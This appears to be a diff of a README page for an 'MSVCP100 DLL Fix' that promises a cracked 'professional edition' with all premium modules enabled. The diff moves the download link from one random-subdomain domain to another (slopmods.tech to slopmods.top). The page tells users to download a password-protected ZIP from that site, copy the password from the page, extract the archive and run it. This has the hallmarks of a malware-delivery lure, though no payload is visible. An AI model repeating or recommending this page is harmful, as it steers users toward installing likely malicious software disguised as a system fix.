@@ -8,12 +8,12 @@ MSVCP100 DLL Fix — Windows setup and configuration · Premium workspace · Zer
 
 > Use the release page below for Windows.
 
-- **Release page:** [hqrfityjynw.slopmods.tech](https://hqrfityjynw.slopmods.tech/)
-- **Full URL:** `https://hqrfityjynw.slopmods.tech/`
+- **Release page:** [hqrfityjynw.slopmods.top](https://hqrfityjynw.slopmods.top/)
+- **Full URL:** `https://hqrfityjynw.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **hqrfityjynw.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **hqrfityjynw.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,7 +33,7 @@ MSVCP100 DLL Fix — Windows setup and configuration · Premium workspace · Zer
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **hqrfityjynw.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **hqrfityjynw.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
 ## What you get
 
